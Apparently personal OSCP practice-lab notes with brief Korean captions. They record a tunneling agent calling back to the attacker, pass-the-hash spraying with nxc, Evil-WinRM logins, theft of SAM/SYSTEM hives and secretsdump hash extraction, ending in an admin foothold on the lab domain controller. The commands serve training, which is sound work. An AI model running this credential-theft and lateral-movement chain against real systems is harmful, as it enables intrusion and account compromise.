[Agent : OSCP\eric.wallows@MS01] » interface_create --name 10.10.144.0
INFO[0207] Creating a new 10.10.144.0 interface...
INFO[0207] Interface created!
[Agent : OSCP\eric.wallows@MS01] » route_add -name 10.10.144.0 --route 10.10.144.0/24
error: invalid flag: -name
[Agent : OSCP\eric.wallows@MS01] » route_add --name 10.10.144.0 --route 10.10.144.0/24
INFO[0235] Route created.
[Agent : OSCP\eric.wallows@MS01] » start --tun 10.10.144.0
INFO[2049] Starting tunnel to OSCP\eric.wallows@MS01 (fa163e8b5356)

*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\agent.exe -connect 192.168.45.223:11601 -ignore-cert
agent.exe : time="2026-08-12T07:03:16-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-08-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-08-12T07:03:16-07:00" level=info msg="Connection established" addr="192.168.45.223:11601"
```


확보한 아이디로 스프레이 진행
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc winrm 10.10.144.140 10.10.144.142 -u users.txt -H hash.txt
WINRM       10.10.144.140   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
WINRM       10.10.144.142   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
WINRM       10.10.144.140   5985   DC01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
WINRM       10.10.144.140   5985   DC01             [-] oscp.exam\Mary.Williams:e728ecbadfb02f51ce8eed753f3ff3fd
WINRM       10.10.144.140   5985   DC01             [-] oscp.exam\celia.almeda:9a3121977ee93af56ebd0ef4f527a35e
WINRM       10.10.144.140   5985   DC01             [-] oscp.exam\Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e
WINRM       10.10.144.142   5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
WINRM       10.10.144.142   5985   MS02             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd zip() argument 2 is longer than argument 1
WINRM       10.10.144.142   5985   MS02             [-] oscp.exam\Mary.Williams:e728ecbadfb02f51ce8eed753f3ff3fd
WINRM       10.10.144.142   5985   MS02             [-] oscp.exam\celia.almeda:9a3121977ee93af56ebd0ef4f527a35e
WINRM       10.10.144.142   5985   MS02             [-] oscp.exam\Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

celia.almeda 접속
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ evil-winrm -i 10.10.144.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd                   
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
oscp\celia.almeda S-1-5-21-2610934713-1581164095-2706428072-1105


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Nmap
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nnmap 10.10.157.140
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-13 10:10 +0900
Nmap scan report for 10.10.157.140
Host is up (0.060s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-13 08:11:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2026-08-13T08:13:33+00:00; +6h59m59s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-08-12T07:32:25
|_Not valid after:  2036-08-10T07:32:25
9389/tcp  open  mc-nmf        .NET Message Framing
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
61140/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s
| smb2-time:
|   date: 2026-08-13T08:12:39
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: fa:16:3e:14:35:98 (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

TRACEROUTE
HOP RTT      ADDRESS
1   59.64 ms 10.10.157.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.97 seconds
```

Nmap
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nnmap 10.10.157.142
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-13 10:14 +0900
Nmap scan report for 10.10.157.142
Host is up (0.067s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.157.142:1433:
|     Target_Name: OSCP
|     NetBIOS_Domain_Name: OSCP
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: MS02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.19041
|_ssl-date: 2026-08-13T08:18:29+00:00; +6h59m59s from scanner time.
| ms-sql-info:
|   10.10.157.142:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-13T07:33:25
|_Not valid after:  2056-08-13T07:33:25
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-08-12T07:34:15
|_Not valid after:  2036-08-10T07:34:15
| tls-alpn:
|   h2
|_  http/1.1
|_http-title: Not Found
|_ssl-date: 2026-08-13T08:18:30+00:00; +6h59m59s from scanner time.
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-13T07:33:25
|_Not valid after:  2056-08-13T07:33:25
| ms-sql-ntlm-info:
|   10.10.157.142:49700:
|     Target_Name: OSCP
|     NetBIOS_Domain_Name: OSCP
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: MS02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.19041
| ms-sql-info:
|   10.10.157.142:49700:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49700
|_ssl-date: 2026-08-13T08:18:29+00:00; +6h59m59s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-08-13T08:17:48
|_  start_date: N/A
|_nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: fa:16:3e:af:9f:7b (unknown)
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s

TRACEROUTE
HOP RTT      ADDRESS
1   66.53 ms 10.10.157.142

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 248.62 seconds
```



windows.old 에서 `SAM,SYSTEM` 파일 다운로드
```bash
*Evil-WinRM* PS C:\windows.old\windows\system32> ls


    Directory: C:\windows.old\windows\system32


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                AppLocker
d-----          4/4/2022   6:03 AM                Boot
d---s-          4/4/2022   6:03 AM                Configuration
d-----          4/4/2022   6:03 AM                DriverState
d-----          4/4/2022   6:03 AM                DriverStore
d-----          4/4/2022   6:04 AM                en-US
d---s-          4/4/2022   6:06 AM                Microsoft
-a----         12/7/2019   1:09 AM         113256 compmgmt.msc
-a----         12/7/2019   1:09 AM           9571 ResPriHMImageList
-a----         12/7/2019   1:09 AM           9196 ResPriHMImageListLowCost
-a----         12/7/2019   1:09 AM           8977 ResPriImageList
-a----         12/7/2019   1:09 AM           8690 ResPriImageListLowCost
-a----          4/4/2022   6:00 AM          57344 SAM
-a----          4/4/2022   6:00 AM       11636736 SYSTEM
-a----         3/25/2022   1:34 PM         230400 WorkFoldersShell.dll
-a----         3/25/2022   1:34 PM        2229576 workfolderssvc.dll
-a----         3/25/2022   1:31 PM         283648 wosc.dll
-a----         3/25/2022   1:32 PM         352816 wow64.dll
-a----         3/25/2022   1:32 PM          21288 wow64cpu.dll
-a----         3/25/2022   1:32 PM         531984 wow64win.dll
-a----         3/25/2022   1:33 PM          17920 wowreg32.exe
-a----         3/25/2022   1:31 PM         452608 WpAXHolder.dll
-a----         12/7/2019   1:08 AM         103424 wpbcreds.dll
-a----         3/25/2022   1:31 PM        1643008 Wpc.dll
-a----         3/25/2022   1:31 PM         336896 WpcApi.dll
-a----         12/7/2019   1:08 AM          10143 wpcatltoast.png
-a----         3/25/2022   1:31 PM        1867264 WpcDesktopMonSvc.dll
-a----         3/25/2022   1:31 PM        1173472 WpcMon.exe
-a----         12/7/2019   1:08 AM           4687 wpcmon.png
-a----        11/18/2020   6:48 PM          40448 WpcProxyStubs.dll
-a----         3/25/2022   1:34 PM          91648 WwanRadioManager.dll
-a----         3/25/2022   1:31 PM        1518080 wwansvc.dll
-a----        11/18/2020   6:48 PM          97600 wwapi.dll
-a----         3/25/2022   1:31 PM         233984 XamlTileRender.dll
-a----         12/7/2019   1:08 AM           3584 XAudio2_8.dll
-a----         3/25/2022   1:31 PM         623616 XAudio2_9.dll
-a----         3/25/2022   1:31 PM        1049088 XblAuthManager.dll
-a----         3/25/2022   1:31 PM          93696 XblAuthManagerProxy.dll
-a----         3/25/2022   1:31 PM         114688 XblAuthTokenBrokerExt.dll
-a----         3/25/2022   1:31 PM        1270272 XblGameSave.dll
-a----         12/7/2019   1:08 AM         159744 XblGameSaveExt.dll
-a----         12/7/2019   1:08 AM          39936 XblGameSaveProxy.dll
-a----        11/18/2020   6:48 PM          33792 XblGameSaveTask.exe
-a----         12/7/2019   1:08 AM            627 X_80.contrast-black.png
-a----         12/7/2019   1:08 AM            579 X_80.contrast-white.png
-a----         12/7/2019   1:08 AM            627 X_80.png
```

```powershell
*Evil-WinRM* PS C:\windows.old\windows\system32> download SAM

Info: Downloading C:\windows.old\windows\system32\SAM to SAM

Info: Download successful!
*Evil-WinRM* PS C:\windows.old\windows\system32> download SYSTEM

Info: Downloading C:\windows.old\windows\system32\SYSTEM to SYSTEM

Info: Download successful!
```

다운 받은 SYSTEM, SAM 을 해시 덤프
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up...
```


획득값 값들 정리
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ awk -F: '{print $1}' ID > users_142.txt

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ cat users_142.txt
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
tom_admin
Cheyanne.Adams
David.Rhys
Mark.Chetty

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ awk -F: '{print $4}' ID > hash_142.txt
# 빈 비밀번호 해시 제거 
awk -F: '$4!="31d6cfe0d16ae931b73c59d7e0c089c0"{print $1":"$4}' hashes.txt

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ cat hash_142.txt
31d6cfe0d16ae931b73c59d7e0c089c0
31d6cfe0d16ae931b73c59d7e0c089c0
31d6cfe0d16ae931b73c59d7e0c089c0
acbb9b77c62fdd8fe5976148a933177a
4979d69d4ca66955c075c41cf45f24dc
b3930e99899cb55b4aefef9a7021ffd0
9ac088de348444c71dba2dca92127c11
92903f280e5c5f3cab018bd91b94c771

```

스프레이 진행 `tom_admin,4979d69d4ca66955c075c41cf45f24dc ` 획득
142 서버 동일
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc smb 10.10.157.140 -u users_142.txt -H hash_142.txt --continue-on-success
SMB         10.10.157.140   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         10.10.157.140   445    DC01             [-] oscp.exam\DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\WDAGUtilityAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Cheyanne.Adams:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\David.Rhys:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Mark.Chetty:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         10.10.157.140   445    DC01             [-] oscp.exam\DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\WDAGUtilityAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Cheyanne.Adams:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\David.Rhys:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Mark.Chetty:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         10.10.157.140   445    DC01             [-] oscp.exam\DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\WDAGUtilityAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Cheyanne.Adams:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\David.Rhys:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Mark.Chetty:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Administrator:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Guest:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\DefaultAccount:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\WDAGUtilityAccount:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\tom_admin:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Cheyanne.Adams:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\David.Rhys:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Mark.Chetty:acbb9b77c62fdd8fe5976148a933177a STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Administrator:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Guest:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\DefaultAccount:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\WDAGUtilityAccount:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [+] oscp.exam\tom_admin:4979d69d4ca66955c075c41cf45f24dc (Pwn3d!)
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Cheyanne.Adams:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\David.Rhys:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Mark.Chetty:4979d69d4ca66955c075c41cf45f24dc STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Administrator:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Guest:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\DefaultAccount:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\WDAGUtilityAccount:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Cheyanne.Adams:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\David.Rhys:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Mark.Chetty:b3930e99899cb55b4aefef9a7021ffd0 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Administrator:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Guest:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\DefaultAccount:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\WDAGUtilityAccount:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Cheyanne.Adams:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\David.Rhys:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Mark.Chetty:9ac088de348444c71dba2dca92127c11 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Administrator:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Guest:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\DefaultAccount:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\WDAGUtilityAccount:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Cheyanne.Adams:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\David.Rhys:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE
SMB         10.10.157.140   445    DC01             [-] oscp.exam\Mark.Chetty:92903f280e5c5f3cab018bd91b94c771 STATUS_LOGON_FAILURE

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc smb 10.10.157.142 -u users_142.txt -H hash_142.txt --continue-on-success
SMB         10.10.157.142   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         10.10.157.142   445    MS02             [-] oscp.exam\DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\WDAGUtilityAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Cheyanne.Adams:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\David.Rhys:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Mark.Chetty:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         10.10.157.142   445    MS02             [-] oscp.exam\DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\WDAGUtilityAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Cheyanne.Adams:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\David.Rhys:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Mark.Chetty:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED
SMB         10.10.157.142   445    MS02             [-] oscp.exam\DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\WDAGUtilityAccount:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\tom_admin:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Cheyanne.Adams:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\David.Rhys:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         10.10.157.142   445    MS02             [-] oscp.exam\Mark.Chetty:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
